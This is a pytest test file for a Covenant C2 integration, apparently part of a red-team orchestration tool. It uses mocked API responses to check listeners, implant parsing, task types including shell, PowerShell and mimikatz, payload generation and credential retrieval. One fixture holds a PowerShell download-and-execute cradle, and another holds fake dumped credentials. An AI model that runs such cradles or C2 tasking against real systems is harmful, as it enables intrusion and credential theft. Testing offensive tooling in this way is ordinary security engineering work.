"""Tests CovenantC2 — REST API JWT (.NET C2, port 7443)."""
from __future__ import annotations

import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from c2_manager.integrations.covenant import CovenantC2, _ACTIVE_STATUSES
from c2_manager.models import C2Config, C2Type, C2Status
from c2_manager.models.payload import PayloadConfig
from tests.c2_manager.conftest import make_resp


# ── Fixtures ─────────────────────────────────────────────────────────────────

@pytest.fixture
def covenant_config() -> C2Config:
    return C2Config(
        name="test-covenant",
        c2_type=C2Type.COVENANT,
        host="127.0.0.1",
        port=7443,
        ssl=True,
        username="Admin",
        password="CovenantDev!",
        extra={"verify_ssl": False},
    )


@pytest.fixture
def covenant(covenant_config):
    c = CovenantC2()
    c._config  = covenant_config
    c._status  = C2Status.CONNECTED
    c._client  = AsyncMock()
    c._token   = "eyJhbGciOiJIUzI1NiJ9.fake.token"
    return c


@pytest.fixture
def grunt_data():
    return {
        "id": 42,
        "name": "GruntHTTP42",
        "status": "Active",
        "listenerId": 1,
        "remoteIPAddress": "8.8.8.8",
        "ipAddress": "192.168.1.100",
        "hostname": "CORP-PC01",
        "userName": "CORP\\jdoe",
        "operatingSystem": "Windows 10",
        "dotNetVersion": "Net40",
        "architecture": "x64",
        "processId": 4567,
        "processName": "explorer.exe",
        "integrityLevel": 2,  # Medium = USER
        "activationTime": "2024-01-15T10:30:00Z",
        "lastCheckIn":    "2024-01-15T14:00:00Z",
        "delay": 5,
        "jitter": 0,
    }


# ── Tests Auth ────────────────────────────────────────────────────────────────

class TestCovenantAuth:
    @pytest.mark.asyncio
    async def test_authenticate_success(self, covenant_config):
        c = CovenantC2()
        mock_resp = make_resp(200, {"covenantToken": "jwt-token-abc"})

        with patch("httpx.AsyncClient") as mock_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__  = AsyncMock(return_value=False)
            mock_client.post       = AsyncMock(return_value=mock_resp)
            mock_cls.return_value  = mock_client

            token = await c._authenticate(covenant_config)

        assert token == "jwt-token-abc"

    @pytest.mark.asyncio
    async def test_authenticate_wrong_creds(self, covenant_config):
        from c2_manager.interfaces import C2AuthError
        c = CovenantC2()
        mock_resp = make_resp(401, {"message": "Invalid credentials"})

        with patch("httpx.AsyncClient") as mock_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__  = AsyncMock(return_value=False)
            mock_client.post       = AsyncMock(return_value=mock_resp)
            mock_cls.return_value  = mock_client

            with pytest.raises(C2AuthError, match="auth échouée"):
                await c._authenticate(covenant_config)

    @pytest.mark.asyncio
    async def test_authenticate_no_token_in_response(self, covenant_config):
        from c2_manager.interfaces import C2AuthError
        c = CovenantC2()
        mock_resp = make_resp(200, {"status": "ok"})  # pas de token

        with patch("httpx.AsyncClient") as mock_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__  = AsyncMock(return_value=False)
            mock_client.post       = AsyncMock(return_value=mock_resp)
            mock_cls.return_value  = mock_client

            with pytest.raises(C2AuthError, match="Token Covenant absent"):
                await c._authenticate(covenant_config)

    @pytest.mark.asyncio
    async def test_authenticate_alt_token_field(self, covenant_config):
        """Covenant peut renvoyer 'token' ou 'access_token' selon la version."""
        c = CovenantC2()
        mock_resp = make_resp(200, {"access_token": "alternative-token"})

        with patch("httpx.AsyncClient") as mock_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__  = AsyncMock(return_value=False)
            mock_client.post       = AsyncMock(return_value=mock_resp)
            mock_cls.return_value  = mock_client

            token = await c._authenticate(covenant_config)

        assert token == "alternative-token"


# ── Tests Listeners ───────────────────────────────────────────────────────────

class TestCovenantListeners:
    @pytest.mark.asyncio
    async def test_list_listeners_empty(self, covenant):
        mock_resp = make_resp(200, [])
        covenant._client.get = AsyncMock(return_value=mock_resp)
        result = await covenant.list_listeners()
        assert result == []

    @pytest.mark.asyncio
    async def test_list_listeners_with_data(self, covenant):
        data = [
            {
                "id": 1, "name": "HTTP-1", "status": "Active",
                "bindAddress": "0.0.0.0", "bindPort": 80,
                "listenerType": {"name": "HTTP"},
                "connectAddresses": ["10.0.0.1"],
                "profileId": 2,
            },
            {
                "id": 2, "name": "HTTPS-443", "status": "Stopped",
                "bindAddress": "0.0.0.0", "bindPort": 443,
                "listenerType": {"name": "HTTPS"},
                "connectAddresses": [],
                "profileId": 3,
            },
        ]
        mock_resp = make_resp(200, data)
        covenant._client.get = AsyncMock(return_value=mock_resp)

        result = await covenant.list_listeners()
        assert len(result) == 2
        assert result[0].name == "HTTP-1"
        assert result[0].status == "running"
        assert result[0].bind_port == 80
        assert result[1].status == "stopped"

    @pytest.mark.asyncio
    async def test_create_http_listener(self, covenant):
        mock_resp = make_resp(201, {
            "id": 5, "name": "my-http", "status": "Active",
            "bindAddress": "0.0.0.0", "bindPort": 8080,
        })
        covenant._client.post = AsyncMock(return_value=mock_resp)

        listener = await covenant.create_listener({
            "protocol":  "http",
            "bind_host": "0.0.0.0",
            "bind_port": 8080,
            "name":      "my-http",
        })
        assert listener.id == "5"
        assert listener.bind_port == 8080
        assert listener.protocol == "http"
        assert listener.status == "running"

    @pytest.mark.asyncio
    async def test_create_https_listener(self, covenant):
        mock_resp = make_resp(201, {
            "id": 6, "name": "secure", "status": "Active",
            "bindAddress": "0.0.0.0", "bindPort": 443,
        })
        covenant._client.post = AsyncMock(return_value=mock_resp)

        listener = await covenant.create_listener({
            "protocol":  "https",
            "bind_port": 443,
        })
        assert listener.protocol == "https"
        # Vérifie qu'on a posté sur le bon endpoint
        call_args = covenant._client.post.call_args
        assert "httpslisteners" in call_args[0][0]

    @pytest.mark.asyncio
    async def test_create_bridge_listener(self, covenant):
        mock_resp = make_resp(201, {"id": 7, "name": "bridge", "status": "Active",
                                     "bindAddress": "0.0.0.0", "bindPort": 31337})
        covenant._client.post = AsyncMock(return_value=mock_resp)

        listener = await covenant.create_listener({"protocol": "bridge", "bind_port": 31337})
        call_args = covenant._client.post.call_args
        assert "bridgelisteners" in call_args[0][0]

    @pytest.mark.asyncio
    async def test_remove_listener_success(self, covenant):
        mock_resp = make_resp(204, {})
        covenant._client.delete = AsyncMock(return_value=mock_resp)
        result = await covenant.remove_listener("1")
        assert result is True

    @pytest.mark.asyncio
    async def test_remove_listener_error(self, covenant):
        covenant._client.delete = AsyncMock(side_effect=Exception("Network error"))
        result = await covenant.remove_listener("99")
        assert result is False


# ── Tests Grunts ─────────────────────────────────────────────────────────────

class TestCovenantGrunts:
    @pytest.mark.asyncio
    async def test_list_agents_active(self, covenant, grunt_data):
        mock_resp = make_resp(200, [grunt_data])
        covenant._client.get = AsyncMock(return_value=mock_resp)

        agents = await covenant.list_agents()
        assert len(agents) == 1
        a = agents[0]
        assert a.id == "42"
        assert a.name == "GruntHTTP42"
        assert a.hostname == "CORP-PC01"
        assert a.username == "CORP\\jdoe"
        assert a.integrity == "USER"  # integrityLevel=2 → USER
        assert a.active is True

    @pytest.mark.asyncio
    async def test_list_agents_lost(self, covenant, grunt_data):
        grunt_data["status"] = "Lost"
        mock_resp = make_resp(200, [grunt_data])
        covenant._client.get = AsyncMock(return_value=mock_resp)

        agents = await covenant.list_agents()
        assert agents[0].active is False

    def test_parse_grunt_integrity_levels(self, covenant):
        """Test mapping integrity level numérique."""
        for level, expected in [(4, "SYSTEM"), (3, "ADMIN"), (2, "USER"), (1, "USER"), (0, "USER")]:
            g = {
                "id": 1, "name": "g", "status": "Active",
                "integrityLevel": level,
                "activationTime": "2024-01-01T00:00:00Z",
            }
            implant = covenant._parse_grunt(g)
            assert implant.integrity == expected, f"Level {level} → attendu {expected}"

    def test_parse_grunt_integrity_string_admin(self, covenant):
        g = {
            "id": 1, "name": "g", "status": "Active",
            "integrityLevel": "ADMINISTRATOR",
            "activationTime": "2024-01-01T00:00:00Z",
        }
        implant = covenant._parse_grunt(g)
        assert implant.integrity == "ADMIN"

    def test_parse_grunt_listener_from_dict(self, covenant):
        g = {
            "id": 1, "name": "g", "status": "Connected",
            "listener": {"id": 99, "name": "my-listener"},
            "activationTime": "2024-01-01T00:00:00Z",
        }
        implant = covenant._parse_grunt(g)
        assert implant.listener_id == "99"

    def test_parse_grunt_timestamps(self, covenant):
        from datetime import datetime
        g = {
            "id": 1, "name": "g", "status": "Active",
            "activationTime": "2024-03-15T12:00:00Z",
            "lastCheckIn":    "2024-03-15T14:30:00Z",
        }
        implant = covenant._parse_grunt(g)
        assert implant.first_seen.month == 3
        assert implant.last_checkin.hour == 14


# ── Tests Tâches ─────────────────────────────────────────────────────────────

class TestCovenantTasks:
    @pytest.mark.asyncio
    async def test_send_shell_task(self, covenant):
        mock_resp = make_resp(201, {"id": 100, "status": "Tasked", "type": "ShellCmd"})
        covenant._client.post = AsyncMock(return_value=mock_resp)

        task = await covenant.send_task("42", "shell whoami")
        assert task.id == "100"
        assert task.status == "Tasked"
        assert task.agent_id == "42"

    @pytest.mark.asyncio
    async def test_send_powershell_task(self, covenant):
        mock_resp = make_resp(201, {"id": 101, "status": "Tasked", "type": "PowerShell"})
        covenant._client.post = AsyncMock(return_value=mock_resp)

        task = await covenant.send_task("42", "ps Get-Process")
        assert task.id == "101"
        call_json = covenant._client.post.call_args[1]["json"]
        assert call_json["Type"] == "PowerShell"

    @pytest.mark.asyncio
    async def test_send_mimikatz_task(self, covenant):
        mock_resp = make_resp(201, {"id": 102, "status": "Tasked"})
        covenant._client.post = AsyncMock(return_value=mock_resp)

        task = await covenant.send_task("42", "mimikatz")
        call_json = covenant._client.post.call_args[1]["json"]
        assert call_json["Type"] == "Mimikatz"

    @pytest.mark.asyncio
    async def test_send_assembly_task(self, covenant):
        mock_resp = make_resp(201, {"id": 103, "status": "Tasked"})
        covenant._client.post = AsyncMock(return_value=mock_resp)

        task = await covenant.send_task("42", "assembly Seatbelt.exe -group=all", ["extra"])
        call_json = covenant._client.post.call_args[1]["json"]
        assert call_json["Type"] == "Assembly"

    @pytest.mark.asyncio
    async def test_get_task_result_with_grunt_id(self, covenant):
        mock_resp = make_resp(200, {
            "id": 100,
            "type": "ShellCmd",
            "status": "Completed",
            "gruntTaskingOutput": {"output": "corp\\jdoe"},
        })
        covenant._client.get = AsyncMock(return_value=mock_resp)

        result = await covenant.get_task_result("42/100")
        assert result["result"] == "corp\\jdoe"
        assert result["status"] == "Completed"

    @pytest.mark.asyncio
    async def test_get_task_history(self, covenant):
        mock_resp = make_resp(200, [
            {"id": 1, "type": "ShellCmd", "status": "Completed",
             "gruntTaskingOutput": {"output": "whoami"}, "taskingTime": "2024-01-15"},
            {"id": 2, "type": "PowerShell", "status": "Tasked",
             "gruntTaskingOutput": {}, "taskingTime": "2024-01-15"},
        ])
        covenant._client.get = AsyncMock(return_value=mock_resp)

        history = await covenant.get_task_history("42")
        assert len(history) == 2
        assert history[0]["type"] == "ShellCmd"
        assert history[0]["output"] == "whoami"

    def test_task_type_map_coverage(self, covenant):
        """Vérifie la présence des types courants dans le mapping."""
        for cmd in ("shell", "ps", "assembly", "mimikatz", "screenshot", "whoami", "exit"):
            assert cmd in covenant._TASK_TYPE_MAP, f"Type '{cmd}' manquant"


# ── Tests Payload ─────────────────────────────────────────────────────────────

class TestCovenantPayload:
    @pytest.mark.asyncio
    async def test_generate_binary_payload(self, covenant):
        import base64
        fake_pe = b"MZ" + b"\x00" * 200
        b64_pe  = base64.b64encode(fake_pe).decode()

        get_resp = make_resp(200, {
            "launcherString": b64_pe,
            "name": "GruntHTTP",
        })
        put_resp = make_resp(200, {})
        covenant._client.put = AsyncMock(return_value=put_resp)
        covenant._client.get = AsyncMock(return_value=get_resp)

        cfg = PayloadConfig(
            name="grunt-http",
            c2_type=C2Type.COVENANT,
            listener_id="1",
            format="exe",
            arch="x64",
        )
        payload = await covenant.generate_payload(cfg)
        assert payload == fake_pe

    @pytest.mark.asyncio
    async def test_generate_powershell_payload(self, covenant):
        ps_data = "IEX(New-Object Net.WebClient).DownloadString('http://x')"
        get_resp = make_resp(200, {"launcherString": ps_data})
        put_resp = make_resp(200, {})
        covenant._client.put = AsyncMock(return_value=put_resp)
        covenant._client.get = AsyncMock(return_value=get_resp)

        cfg = PayloadConfig(
            name="grunt-ps",
            c2_type=C2Type.COVENANT,
            listener_id="1",
            format="ps1",
            arch="x64",
        )
        payload = await covenant.generate_payload(cfg)
        # PS1 = texte encodé en base64 → decode puis ré-encode
        assert len(payload) > 0


# ── Tests Credentials ─────────────────────────────────────────────────────────

class TestCovenantCredentials:
    @pytest.mark.asyncio
    async def test_get_credentials(self, covenant):
        mock_resp = make_resp(200, [
            {"id": 1, "type": "password", "domain": "CORP",
             "username": "jdoe", "password": "P@ssw0rd", "hash": ""},
            {"id": 2, "type": "hash", "domain": "CORP",
             "username": "admin", "password": "", "hash": "aad3b435b51404eeaad3b435b51404ee"},
        ])
        covenant._client.get = AsyncMock(return_value=mock_resp)

        creds = await covenant.get_credentials()
        assert len(creds) == 2
        assert creds[0]["username"] == "jdoe"
        assert creds[1]["hash"].startswith("aad3b")

    @pytest.mark.asyncio
    async def test_list_launchers(self, covenant):
        mock_resp = make_resp(200, [
            {"type": "binary", "listenerId": 1, "dotNetVersion": "Net40", "delay": 5},
            {"type": "powershell", "listenerId": 1, "dotNetVersion": "Net40", "delay": 5},
        ])
        covenant._client.get = AsyncMock(return_value=mock_resp)

        launchers = await covenant.list_launchers()
        assert len(launchers) == 2
        assert launchers[0]["type"] == "binary"


# ── Tests statut et capabilities ─────────────────────────────────────────────

class TestCovenantStatusCaps:
    @pytest.mark.asyncio
    async def test_get_status_connected(self, covenant):
        mock_resp = make_resp(200, [])
        covenant._client.get = AsyncMock(return_value=mock_resp)
        status = await covenant.get_status()
        assert status == C2Status.CONNECTED

    @pytest.mark.asyncio
    async def test_get_status_error(self, covenant):
        covenant._client.get = AsyncMock(side_effect=Exception("timeout"))
        status = await covenant.get_status()
        assert status == C2Status.ERROR

    @pytest.mark.asyncio
    async def test_get_status_no_client(self):
        c = CovenantC2()
        status = await c.get_status()
        assert status == C2Status.DISCONNECTED

    @pytest.mark.asyncio
    async def test_get_capabilities(self, covenant):
        caps = await covenant.get_capabilities()
        for expected in ("list_agents", "send_task", "create_listener",
                         "generate_payload", "mimikatz"):
            assert expected in caps, f"Capability '{expected}' manquante"

    def test_active_statuses_constant(self):
        assert "Active" in _ACTIVE_STATUSES
        assert "Connected" in _ACTIVE_STATUSES
        assert "Lost" not in _ACTIVE_STATUSES
        assert "Exited" not in _ACTIVE_STATUSES
